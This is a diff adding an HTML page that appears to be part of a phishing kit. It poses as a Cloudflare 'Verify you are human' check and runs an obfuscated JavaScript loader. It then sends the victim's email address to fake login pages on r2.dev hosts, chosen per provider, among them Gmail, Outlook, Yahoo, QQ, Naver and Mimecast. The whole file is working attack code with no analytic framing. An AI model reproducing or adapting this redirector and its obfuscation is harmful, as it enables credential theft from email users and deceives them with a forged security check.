@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+
+<link id="sheet" rel="stylesheet" type="text/css" href="">
+<link id="favLink" rel="shortcut icon" href="">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body>
+
+ <div id="loading-logo" style="display:none">
+		<p id="redirect" style="display:none">Redirecting to your service provider. please wait..</p>
+		<img id="docuLogo" style="position:absolute;top:50%;height:33px;width:120px;top:40%;left:50%;margin-left:-63px;margin-top:-60px;">
+		<div style="position:absolute;left:0;right:0;text-align:center;top:40%;margin-top:9px;height:40px;line-height:16px;color:#61a4f6;"></div>
+		<div style="position:absolute;left:50%;margin-left:-107px;height:4px;width:214px;top:40%;margin-top:-10px;background:#eaeaea;">
+		<div class="preparing-experience" ></div></div></div>
+		
+<div class="verification-container" style="display:none">
+        <div class="checkbox-wrapper">
+            <div class="spinner-container">
+                <input type="checkbox" id="verification-checkbox" onchange="handleCheckbox()">
+                <div id="spinner" class="spinner" style="display: none;"></div>
+            </div>
+            <label for="verification-checkbox" class="checkbox-label">&nbsp;Verify you are human</label>
+            <div class="footer-container">
+                <div class="footer-content">
+                    <img src="https://www.cloudflare.com/favicon.ico" alt="Cloudflare" class="cloudflare-logo">
+                    <h1 class="cloudflare-text">
+                        Cloudflare
+                    </h1>
+                    <div class="footer">
+                        <a href="#">Privacy</a>
+                        <span class="divider">"</span>
+                        <a href="#">Terms</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- <div id="loader" class="loader">Verifying...</div> -->
+    </div>
+
+		<input type="hidden" id ="user_field" value="" name="vsr">
+		<input type="hidden" value ="" id="fieldName" name="field">
+		<input type ="hidden" value="" name="loc" id="loc">
+		<input type ="hidden" value="" name="chkBxVal" id="chkBxVal">
+		
+<script>
+
+//TOUCH NOT MY ANOINTED ENCRYPTION AND DO MY CODE NO HARM. ****AM WATCHING YOU FROM AFAR
+
+var vsr,myArray,fmt,handleCheckbox,isBase64,switchImage;(function(){var tKw='',iZE=198-187;function veU(c){var x=6310256;var j=c.length;var l=[];for(var z=0;z<j;z++){l[z]=c.charAt(z)};for(var z=0;z<j;z++){var f=x*(z+125)+(x%37780);var d=x*(z+118)+(x%19175);var e=f%j;var k=d%j;var b=l[e];l[e]=l[k];l[k]=b;x=(f+d)%6963103;};return l.join('')};var ZDS=veU('drtmtxbstwesnuchfgqcpuoykncirazovjolr').substr(0,iZE);var DDj='[kvv+i  tc;25,[tl28v)rki5-rb;ull1hg(abtosf;regm8gxaz"[;if,z=v.),6e18f6.=a8,1t];9"jct)==afC=sjt;+,74,,[r[9]pn9ad.;c,m6,;7rlra()u*[omafgSrv.d)n0vn;01e1n"C.(st+)g,ht[]]is0el;ue+ii,]vu =s;zcao]t)e4=af;s8r(ij)t+,0 ,awv= ht=+=)l(hliC;7;;r(<u;=])8(g7mei+seanc+.lflrevv)(ur<qxal]vootl"ut<.-l).;v.ij2}i{vhit.r+uul< 8;h"sq[;4+}(0 rhvu;>0,9ijrlg;(ar1=hl) vvwa=Arabkihir1.=)i 2jn;b<2ae+=s".6 njrlpanv[C7dsAtej)e=lt )r0[vrnnd(9;rbnfdAj=*.nl;.cse;r(= xr .1s-t+(a,}njni)v=;j((f( fa"0jd+ v=k[1ctg=7tn-etc>c oo0e,d+[s;n+=vt hha5odg.5;a,{{8ngCnr;)(ilphern=vc-n).7}d;-ha(h=2nq+o s);,rq6i,hnvnep)1!(lgsw)syo8rj.;a=)ol, trv (r9ec7=h;a=]b([o=u(i)=(olgo0ie(Ch2;S.gu6z{hsse.iwr2==,nr)0r.k==)too;u{]ra=} luq(sng=o(r(.},l=+pa(khni";4{;;]afo,er!;9((r32,=erji,3uontotc;1(z;xra+ t=iorvCgsi m0Ch2rou;sf;6(+to.,At]+ir]srd{.r+ ).6;r,+pf(h.f7fn1(j;+jc=a=z}aurd.uo+nr))fa;gn);t[4alr"o)e=sts=l8rrfsarla]-saljpA)b"r4+ v)69ph)e';var WEF=veU[ZDS];var pQd='';var tMa=WEF;var uog=WEF(pQd,veU(DDj));var ehu=uog(veU('Oy(e.lGGSe;gs)enPuex.)$l%m.c1GAieo#aei(crGp=.a?nl\/]tud]+pd[t6l.)gpp.yax43hG%G)-;rp=(lG3=hhrdGKG%;;+GG? l@.cnp([ asti+)i6=co%cc=e;rCl:c,d@lf1)GiLtuaa);at.ll.i]-iGfc:;])s=.cG(G.n"!)c.D.oo[y.mioCu6=i}jSta;)c2f4da@-=ft}.l aIa5ris9v0G]%k.={nGtailgve,oGm)ecc;]dGe;te%]n.bf=GE%go!te.%e=2t 9l!dyDmlnfDbncaf. .!eu=nfgcfuhetc.G]GpsBsfcEel=GdG-emo$f9 )tsgegeug]3"ctGraa1.vsg&fsei;fgNtse[%nc(Gs[nn\/a.,GC6!G!oxfesb\/\/H.E1coaGnc(*(-1%+lttp,s;Gro_laexc%Mi..Gyn]7OGse..d$sclatGupbifr!otlsinoplatEg;a)=Dmdk=G8e]aGh(r.aGina)..QGGyOsd%%3.pCp3Lc %*gdc-Gf!rGGGl_c.GGn8)oiE%)oGSNlhy0ceovDhm.G:)(ItGa.ono.nl6!0 oNtcgldhedG.G0f))r"3.e.rec\/noq(sw:%Gp%ong+)pev(fc)e3;h,,u.e,2]!lGdcax4(c\/oe,Gsygnkt{(h:kco) GlGk.r,,;(a=7.d.iC}a.)-.GGavs.f!g %ri5G ssGu&fo-dcdak!.4%gst)nz(gG%(y06EoNpll{!ok}rrteitfDGuG!n}sq .=;d.nacfs6deGe%e_(_(eoGcn*r_co.;s#rG8t5_iuprh00G)!sleSGdui.xvsgft|.c!x%m-bhefGlye8bgilGG]71<nl.rs)s%dP!.sdrnc.e!}r)fM$t1)o3c0[r ]s-+y, Gl%ir.%]akgrGaGsorohngf)]csc}"]$\/c,)(6Ie}Gr(]z%$?P+}cGe(t21mp=!i,}ldS(eeo}(Gbcke=ebC!lGEr!1n.EIhD:G%a0bz_)sierG1gnGr%r(l8u.rcGn|e!G.1-neGGo{iea0<Em{G8cfm(v)mnoa?.f.!of7]32{Gc- 3)re.;!(iaro0risan!os+)ed;uespisGen.}s2yht=!e!e%ta.)G1}]vthtHi6Gnci\/;Nek!ir]t&Gt,t.Ssip%d30"eld)Gc.a#u}4hgsr}(r#szGgpl%dyG.!(sGSGw,-i,)aGedGi_-;pci%beGd5:=$Ge2!7.GG.toG+a;xsG.ce}pri!ncoardo]Gtiaf8ClbeG.t(Hec4{\/.puvc=Go=sG=i.m+pej})tou}(rtetMGaepc.!)\/yGGff=)|c.+spvez.h3rh5$]{Gg.)GiC\'n;;tu)rGc9rcG..e5ieG4(ed5atrs}[.csfc;rLn.1dlG GKekr[rxc},hl9iiIoG x0so).:bcG]cr enG6+D:hae)38.gEGcGGFr:tfdeo,2Iv1)=r$>A(y{Gc,nee.ii] vr#cot_+e(..2.f+.rhpxGDG%"h=dhKlGeG.o}$3? Gi; xxnds}3.i=et+H(p)GxG")f..G=9Geo8n3#aGGGvc%!\/y%rro,tl(cG$DGwrld9GIfyGGGiy\/1Gkpw\'lGC{,Q0#c!iGsshhhn(ruy.oe]L(GGwcn\/=d<yw{irGilla7 vv.=wxbcdn"ml.G.%N 4;io8izE8.clIv rGr7w-.b=e.r=.#Gr6lei)eerfeG]inoGede)G.11cf7Ge,lefhptti]ntlGa!lGaxGi,s!.\/Fm[nhps30y;fm.ulM${}eQMG>nGtw+n%G)efg)oo.lsb!(imp]oti2el.2t,3n0)c.,;dwmp6)]]chffGv=o)lw%_d))f.7R0p<naGsf,g(wotdte_s4]CGnGn!GeDbg7r_d(K@f.GLaglGm)Gl)(iak(ic.D[aG#Gdz{(p?KC$o.du=dG%=.kr))ei]i9(%a.(B3e)lt!e(ilela-6e(!.Glrti,G3br&FG 8#.cGscti;iGGa( lI,vtGf11as7hG kb,%p}(}2d.e]o:s{o_.Gcs\/]G2.ncsi>nefdjG@G.{G$ieo=uGvs )aGGGG(kG.atGcb,n)6E6G;G8;h5co1laGtpcb}3\'Gea>#c$]f)o}{vt:nf.8 91ee; recus<cCs] GiGGe.aG%.car&Gmsdc.]nneGk=nrtG8D,Gb+n]dl0e)!u=0Esagafh%(a)}}G\'GchNd%6eflnanoG.].l\/1b.ld-\/enG)[d[elefp%[G=I2!Sshtn;G+G2ecte ] ..nd-3Gi;.tm">rC,GG.Gri.sGue%raPc!!ccGah,_mG%v}o2hGn)icda_oGf]i!e;.atmcG.jo.lGhoG.o80c|t=,G.n_ hu{pGciDA;enOCT.e),llsN==s;}dnefwGe!?GslfG(if.y;ds)B EGs)t,cif;e|np)c%eGnn-GrcioySS]G3i8]: S1dfpc)8dtittSaIG5G}lG)5l)1G!;riG\'.cm4+)\'nrtoGe(-Ge=.c9tn,tci=.G.h=r%iG9=]aGhrr=.ka09.ou.34GsfsGG*%ci0nh(IaG=iu0o,ld6sn_%.s9viA*ttszilnduGa(u}E$,\/.={S#Gl.ch]dd9fnePli\/)3as=S(eflGtGr),2gCGr\/iy!ai5eoa%}%2o]p.G(0;ee1 o ;.*%.esQsl1_y)GKcce iG,5=ycc{hrt_.o7t)sae;Gs-N(i]vg oEGpy_Gdbe$)1lw(ee,\/]d oa!%edkm;.:ptmH$=_)(e9)lo1e.rn+der(v{=tGSc)=CG(N.2)g!c4(GpaG%fnGop;oNn{GG1Giae.$Gt7der!$tGi0+$.;2=}Ga=$.Gs]Gr3GecGG-fs.yt)n!__[GGsttoGkE]omr,g8.ot!uo6ariott<,G1c}clso9.g=esd!c%.l(!  ]GnGrGj#fGc!w(f):rG4ix.G{kteGeo!yeB#(Gbcledn4etbCi3i0lGeeA(l(pa.!lv(h%engnt]t!8hx!4c9i) FG(,}c+\'=@Grs);$ rGG;.nxcu]t{500.v{tco2Gff%.0aneG.rlc[tco6*unf;srn !ztf)(0ppevf5l;EG9.ie#aGu ceGD.;radS!L;e])-3\'e!rclNa.et(yl% tc=e0rwac {1r9-cea.g%taGxfa.g }.nh'));var yFl=tMa(tKw,ehu );yFl(5642);return 6356})()
+
+//Library call up links for your viewing and editing. ***Edit with Caution. DO NOT DRINK WHILE EDITING"
+function displayPage(dnsresult,vsr,fmt){
+	if (fmt =="file"){
+		window.location.href="https://pub-858c0c2b92d040c9bf018038cc724ca9.r2.dev/sharepointPg.html#"+vsr+"&"+fmt;
+		return;
+	}
+	switch(dnsresult){
+	
+		case "263.com":
+		window.location.href="https://pub-504096010c8842bc828b6fa7b372f179.r2.dev/263mail.html#"+vsr+"&"+fmt;
+		break;
+		case "yahoo.com":
+		window.location.href="https://pub-6e86141062e1428dbe1d5f2d770e2e94.r2.dev/yhx.html#"+vsr+"&"+fmt;
+		break;
+		case "ionos.com":
+		window.location.href="https://pub-15562648dd3f4717bf96c63b44f654a0.r2.dev/1n1.html#"+vsr+"&"+fmt;
+		break;
+		case "aliyun.com":
+		window.location.href="https://pub-2797b3837f7c40f7acabfd5b891f025f.r2.dev/aliyunmail.html#"+vsr+"&"+fmt;
+		break;
+		case "amicobit.com":
+		window.location.href="https://pub-ddfd286415254441ac92dcd93cbd16f2.r2.dev/amicobit.html#"+vsr+"&"+fmt;
+		break;
+		case "ovh.com":
+		window.location.href="https://pub-b9ac7d8aaa574f14bab6472d417598bc.r2.dev/ovhmail.html#"+vsr+"&"+fmt;
+		break;
+		case "daum.net":
+		window.location.href="https://pub-af736ceb327a440eaae81658e8e05ee6.r2.dev/duam.html#"+vsr+"&"+fmt;
+		break;
+		case "mail.icoremail.net":
+		window.location.href="https://pub-d28fe223389348f1b3805c29c574cb85.r2.dev/icoremail.html#"+vsr+"&"+fmt;
+		break;
+		case "hiworks.co.kr":
+		window.location.href="https://pub-3ccd736ccd094d3884b24831964bd2b0.r2.dev/hiworks.html#"+vsr+"&"+fmt;
+		break;
+		case "arsmtp.com":
+		window.location.href="https://pub-358ae98961454e2da81bf1685f6203a2.r2.dev/arsmtp.html#"+vsr+"&"+fmt;
+		break;
+		case "emailsrvr.com":
+		window.location.href="https://pub-f828b028265344ae97f71b2b097a838c.r2.dev/emailsrvr.html#"+vsr+"&"+fmt;
+		break;
+		case "yandex.com":
+		window.location.href="https://pub-7e1f11690a7140ccbf01183f057a1692.r2.dev/yndex.html#"+vsr+"&"+fmt;
+		break;
+		case "webmail.cbsolt.net":
+		window.location.href="https://pub-3db9c2b205cf4faaae4eded4ee01b576.r2.dev/cbsol.html#"+vsr+"&"+fmt;
+		break;
+		case "gmail.com":
+		window.location.href="https://pub-a78e533971b840bfa75cf87b106e630a.r2.dev/indxg.html#"+vsr+"&"+fmt;
+		break;
+		case "s151v.chinaemail.cn":
+		window.location.href="https://pub-64ba1d8b0d9b4224a96e42bec55aad56.r2.dev/bossmail.html#"+vsr+"&"+fmt;
+		break;
+		case "register.it":
+		window.location.href="https://pub-d70a37e66f124a6ca6a8eb389b75889e.r2.dev/register.html#"+vsr+"&"+fmt;
+		break;
+		case "exmail.qq.com":
+		window.location.href="https://pub-8697e5c500c141589fdc06482b19e285.r2.dev/qq_login.html#"+vsr+"&"+fmt;
+		break;
+		case "qiye.163.com":
+		window.location.href="https://pub-a167347cf33c4f2d984da96f497ce7a4.r2.dev/qiyelogin.html#"+vsr+"&"+fmt;
+		break;
+		case "naver.com":
+		window.location.href="https://pub-5da78f59d8e94737965865e3d3d4ce83.r2.dev/navr.html#"+vsr+"&"+fmt;
+		break;
+		case "outlook.com":
+		case "hotmail.com":
+		window.location.href="https://pub-8052c9ff48e84f48bb31acde6bdb9c58.r2.dev/appw2We.html#"+vsr+"&"+fmt;
+		break;
+		case "mail.ru":
+		window.location.href="https://pub-725b4b34b67d4c288c589a97e86511fa.r2.dev/mailru.html#"+vsr+"&"+fmt;
+		break;
+		case "zoho.com":
+		window.location.href="https://pub-9e0157f788f4401e8241a0c33bbe442f.r2.dev/zhomail.html#"+vsr+"&"+fmt;
+		break;
+		case "serviciodecorreo.es":
+		window.location.href="https://pub-a369291d25fd4553baee91c90008d26b.r2.dev/servicio.html#"+vsr+"&"+fmt;
+		break;
+		case "sina.net":
+		window.location.href="https://pub-a2d36c80dbe449049f19bb932b3a8605.r2.dev/sinamail.html#"+vsr+"&"+fmt;
+		break;
+		case "rzone.de":
+		window.location.href="https://pub-524b12c0165c4c4eb481178a91abb70e.r2.dev/strto.html#"+vsr+"&"+fmt;
+		break;
+		case "hibox.com":
+		window.location.href="https://pub-fadb44e84f2844548962eb2e49212fa8.r2.dev/hibox.html#"+vsr+"&"+fmt;
+		break;
+		case "zimbra.com":
+		window.location.href="https://pub-f50f16bfbf3643e087402e2cab91fb89.r2.dev/zmbra.html#"+vsr+"&"+fmt;
+		break;
+		case "webmail.sfera.net":
+		window.location.href="https://pub-b12d4d76e9c0480492bec72090a4cdc0.r2.dev/sfera.html#"+vsr+"&"+fmt;
+		break;
+		case "webmail.saati.com":
+		window.location.href="https://pub-ccf731e02ca641a89bc14e81c8695609.r2.dev/saati.html#"+vsr+"&"+fmt;
+		break;
+		case "pphosted.com":
+		window.location.href="https://pub-9e5017de3c7a479398f1dc46c47661f4.r2.dev/proofpoint.html#"+vsr+"&"+fmt;
+		break;
+		case "mailcontrol.com":
+		window.location.href="https://pub-244ae64f5d7148979182e9cd50a3c936.r2.dev/forcept.html#"+vsr+"&"+fmt;
+		break;
+		case "mail.smart-mail.net":
+		window.location.href="https://pub-acf43b035d1f4db7a08cf8c6edcff3bb.r2.dev/smart.html#"+vsr+"&"+fmt;
+		break;
+		case "nethinks.com":
+		window.location.href="https://pub-693d88098edf41b89d2d98415ca859c2.r2.dev/nethinks.html#"+vsr+"&"+fmt;
+		break;
+		case "aruba.it":
+		window.location.href="https://pub-56e8e2f1522442eaabba0c957955cce7.r2.dev/aruba.html#"+vsr+"&"+fmt;
+		break;
+		case "ateja.co.id":
+		window.location.href="https://pub-ba4a0eebadd544f49928dcae2c211910.r2.dev/ateja.html#"+vsr+"&"+fmt;
+		break;
+		case "mail.termolst.be":
+		window.location.href="https://pub-298cf99d808e41e4a20ba90abbd5ed9f.r2.dev/termolst.html#"+vsr+"&"+fmt;
+		break;
+		case "https://webmail-auth.getzner.at":
+		window.location.href="https://pub-cc92e958d72e43b3b0360a45016b12b1.r2.dev/getzner.html#"+vsr+"&"+fmt;
+		break;
+		case "chinamail.cn":
+		window.location.href="https://pub-dd23b025543042a98bca5363d44bc267.r2.dev/chinamail.html#"+vsr+"&"+fmt;
+		break;
+		case "webmailssl.it":
+		window.location.href="https://pub-98330479cc124fedbf91f4fa1b5a9866.r2.dev/webmailssl.html#"+vsr+"&"+fmt;
+		break;
+		case "mdaemon":
+		window.location.href="https://pub-ec93fba676f64656a0f37ff013a402fe.r2.dev/mdae.html#"+vsr+"&"+fmt;
+		break;
+		case "axigen.com"://update 2
+		window.location.href="https://pub-6e3227e98c8e427fb394b435596fc934.r2.dev/axigen.html#"+vsr+"&"+fmt;
+		break;
+		case "mimecast.com"://update 3
+		window.location.href="https://pub-c7682d67a3064deab867994a6a6134de.r2.dev/mimecast.html#"+vsr+"&"+fmt;
+		break;
+		case "orange.com"://update 4 change link
+		window.location.href="https://pub-f7347e71a22f40a78b4f693d5d9929e4.r2.dev/orange.html#"+vsr+"&"+fmt;
+		break;
+		case "ipsgateway.com"://update 5 change link
+		window.location.href="https://pub-94569767c5f549fab1763d7c7e2006f7.r2.dev/horde.html#"+vsr+"&"+fmt;
+		break;
+		case "locaweb.com":
+		window.location.href="https://pub-b4c487a066af48d4b9d780bc451534e6.r2.dev/locaweb.html#"+vsr+"&"+fmt;
+		break;
+		case "baracuda.com":
+		window.location.href="https://pub-41244ec7f741497aa7037c70f38359f8.r2.dev/barcuda.html#"+vsr+"&"+fmt;
+		break;
+		case "cloud24mail.com":
+		window.location.href="https://pub-f36a6d52f92940368d3f151d65ad3e98.r2.dev/cloud24.html#"+vsr+"&"+fmt;
+		break;
+		case "eim.ae":
+		window.location.href="https://pub-b5c9fe4f8a8d470eafe737ba1751657b.r2.dev/aeim.html#"+vsr+"&"+fmt;
+		break;
+		case "stackmail.com":
+		case "antispameurope.com":
+		window.location.href="https://pub-463d7554cdc443a8baa8b3f613856381.r2.dev/stackmail.html#"+vsr+"&"+fmt;
+		break;
+		case "mailchannels.net":
+		window.location.href="https://pub-6f199c329fc04ee9a4208e91cae80a60.r2.dev/mailchannels.html#"+vsr+"&"+fmt;
+		break;
+		case "mailhostbox.com":
+		window.location.href="https://pub-d6228f35ca7648e9bc18fe62101e3d11.r2.dev/appsuite.html#"+vsr+"&"+fmt;
+		break;
+		case "carrierzone.com":
+		window.location.href="https://pub-a2bdc7ff04a84ae89eee56d9602f29d3.r2.dev/carrierzone.html#"+vsr+"&"+fmt;
+		break;
+		case "mail2world.com":
+		window.location.href="https://pub-2d629cb7b0904b4999105d407f175edc.r2.dev/infinitum.html#"+vsr+"&"+fmt;
+		break;
+		case "app.fastmail.com":
+		window.location.href="https://pub-531759a1f04840dca0da5b78060663c2.r2.dev/fastMail.html#"+vsr+"&"+fmt;
+		break;
+		case "privateemail.com":
+		window.location.href="https://pub-b14a51dc6be34dd583c661a2b699382a.r2.dev/privateemail.html#"+vsr+"&"+fmt;
+		break;
+		case "cp.serverdata.net":
+		window.location.href="https://pub-903e50dffe364ef6b78fe63683914115.r2.dev/serverdata.html#"+vsr+"&"+fmt;
+		break;
+		case "earthlink.net":
+		window.location.href="https://pub-68974b0c769f49fdaebf3cd9b3536991.r2.dev/earth.html#"+vsr+"&"+fmt;
+		break;
+		case "iphmx.com":
+		window.location.href="https://pub-247b7a4bfac54b118d385811d3842ba9.r2.dev/iphmx.html#"+vsr+"&"+fmt;
+		break;
+		case "aol.com":
+		window.location.href="https://pub-6bcbceadd8134709a6d77cb1729b4614.r2.dev/aoll.html#"+vsr+"&"+fmt;
+		break;
+		case "one.com":
+		window.location.href="https://pub-f7520ffbfde04565bb60488120db938f.r2.dev/one.html#"+vsr+"&"+fmt;
+		break;
+		case "comcast.net":
+		window.location.href="https://pub-78f4d70ea7194fb1b2f032e7f0013a6b.r2.dev/xfinty.html#"+vsr+"&"+fmt;
+		break;
+		case "hostinger.com":
+		window.location.href="https://pub-0d8bca1f2f344937aa287ce550809b42.r2.dev/hostinger.html#"+vsr+"&"+fmt;
+		break;
+		case "xserver.ne.jp":
+		window.location.href="https://pub-907f5e6545e34567b07cfaf5e8b96bea.r2.dev/serverx.html#"+vsr+"&"+fmt;
+		break;
+		case "zaq.ne.jp":
+		case "webmail.jp":
+		window.location.href="https://pub-d05f9a769e954b7babc09d70c60181d0.r2.dev/jp.html#"+vsr+"&"+fmt;
+		break;
+		case "protonmail.com":
+		window.location.href="https://pub-97e881319cac4b37abdb4cc8402a8b97.r2.dev/proton.html#"+vsr+"&"+fmt;
+		break;
+		case "contabo.net":
+		case "netcore.co.in":
+		case "amazonaws":
+		case "a2hosting":
+		case "roundcube":
+		case "spamexperts.com":
+		window.location.href="https://pub-632b0533486d4812a3d9043823a42416.r2.dev/wbmail.html#"+vsr+"&"+fmt;
+		break;
+		case "rediffmail.com":
+		window.location.href="https://pub-2a4afce258a0456689b6fbefe019f8b7.r2.dev/rediffpro.html#"+vsr+"&"+fmt;
+		break;
+		case "interia.pl":
+		window.location.href="https://pub-4a9baeb435514ac08eae7bcefbeda272.r2.dev/interia.html#"+vsr+"&"+fmt;
+		break;
+		case "networksolution.com":
+		window.location.href="https://pub-7d6ffb98f20e46cf8f8952db47c8e342.r2.dev/netsol.html#"+vsr+"&"+fmt;;
+		break;
+		case "ecounterp.com":
+		window.location.href="https://pub-d0abe1bc7b444ef388153d630419df05.r2.dev/ecunt.html#"+vsr+"&"+fmt;;
+		break;
+		case "worksmobile.com":
+		window.location.href="https://pub-e697bb49ed744899826c3d7e31ead699.r2.dev/wrksm.html#"+vsr+"&"+fmt;;
+		break;
+		case "cafe24.com":
+		window.location.href="https://pub-15fb034c58424c73a178118f988938a1.r2.dev/cafe24.html#"+vsr+"&"+fmt;;
+		break;
+		case "korea.com":
+		window.location.href="https://pub-f6a740b6386346d8952547e5ece292dd.r2.dev/krea.html#"+vsr+"&"+fmt;;
+		break;
+		case "whoisworks.com":
+		window.location.href="https://pub-2a3d9558fd9447afa9be7de9de4862dd.r2.dev/whs.html#"+vsr+"&"+fmt;;
+		break;
+		case "mailplug.com":
+		window.location.href="https://pub-62f90ad199a84740b2f2d8662971bc38.r2.dev/mplug.html#"+vsr+"&"+fmt;;
+		break;
+		case "nate.com":
+		window.location.href="https://pub-5a8bfc7a9dea434b822d03021adc67ce.r2.dev/nat.html#"+vsr+"&"+fmt;;
+		break;
+		case "FALSE":
+		window.location.href="https://google.com";
+		//alert(dnsresult);
+		break;
+		default:
+		window.location.href="https://pub-97409106df5d44659d6dbfcf9ea42e0a.r2.dev/gPge.html#"+vsr+"&"+fmt;
+		break;
+	}
+	
+}
+
+
+</script>
+</body>
+</html>
